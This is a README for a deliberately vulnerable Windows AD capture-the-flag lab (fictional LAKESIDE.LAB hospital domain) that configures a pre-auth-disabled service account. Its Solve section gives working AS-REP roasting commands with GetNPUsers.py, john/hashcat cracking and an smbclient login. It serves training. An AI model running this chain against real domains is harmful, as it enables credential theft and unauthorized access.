# AS-REP Roasting (Active Directory)

One Isoloom **Windows VM lab** — **one `isoloom.yml`** — for the realm **LAKESIDE.LAB** (Lakeside
Regional Hospital). A single **Windows Server 2019** Active Directory Domain Controller (`dc`) has
one legacy document-scanner service account, `svc-scanner`, with Kerberos **pre-authentication
disabled** (`userAccountControl` bit `DONT_REQ_PREAUTH`) and a weak, wordlist-crackable password.
With only a username list and no credentials, a player AS-REP roasts `svc-scanner`, cracks the hash
offline, and reads the flag from an imaging share only that account may open.

## A Windows Server AD DC

Windows has no container form in Isoloom 1.0, so this is a VM lab:

| Command | What it builds |
| --- | --- |
| `isoloom generate vagrant` | a Windows Server 2019 VM (libvirt / QEMU / VirtualBox / Hyper-V) that Isoloom's Ansible controller promotes to the LAKESIDE.LAB forest over WinRM with `provision/ad-domain.yml` |
| `isoloom generate docker` | **refused** — "Windows has no container form in 1.0" |

A real Windows KDC honours `DONT_REQ_PREAUTH`, and with RC4 still enabled by default it hands back
an **RC4-HMAC** AS-REP (`$krb5asrep$svc-scanner@LAKESIDE.LAB:...`, no etype number) — crackable with
`john --format=krb5asrep` (as emitted) or `hashcat -m 18200` (insert `23$` after `$krb5asrep$`).

The domain is set up from the controller (it reaches the DC over WinRM, no per-machine `reboot`
step — the forest promotion reboots via `microsoft.ad.domain`). The flag arrives as Isoloom's
sensitive input at `C:\ctf\flag.txt`; `provision/files/configure.ps1` copies it into the `imaging`
share, whose share and NTFS permissions admit only `svc-scanner` (and administrators).

Server 2019 is used because it is the only Windows Server with a libvirt/QEMU box in Isoloom, so it
boots on a libvirt host and under QEMU on an Apple-Silicon Mac (as well as VirtualBox/VMware/Hyper-V).
2022/2025 map only a VirtualBox/VMware/Hyper-V box.

| Machine | Service |
| --- | --- |
| `dc` | Windows Server AD DC: DNS 53, Kerberos 88, LDAP 389, SMB 445, kpasswd 464, GC 3268 |

## Run it

```bash
# A Windows Server 2019 VM, on a libvirt/QEMU/VirtualBox/VMware/Hyper-V host
isoloom run vagrant . && isoloom test vagrant . && isoloom down vagrant .
```

## Solve

```bash
# resolver + /etc/krb5.conf pointed at the DC, usernames in users.txt, then:
GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format john
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash      # RC4-HMAC; or hashcat -m 18200 (add 23$)
smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'
```

This environment is deliberately vulnerable: keep it isolated.

## Layout

- `isoloom.yml` — the single Windows VM spec.
- `provision/ad-domain.yml` — the controller playbook: AD DS role, forest promotion, then the setup.
- `provision/files/configure.ps1` — PowerShell run on the DC: staff decoys, the pre-auth-disabled
  `svc-scanner`, the imaging share + NTFS ACL, and the flag.
- `provision/requirements.yml` — the Ansible collections (`ansible.windows`, `microsoft.ad`).
- `checks/dc-answers.sh` — the DC answers DNS / Kerberos / LDAP / SMB.
- `.github/workflows/` — `validate.yml` (spec + VM generation), `publish.yml` (register).
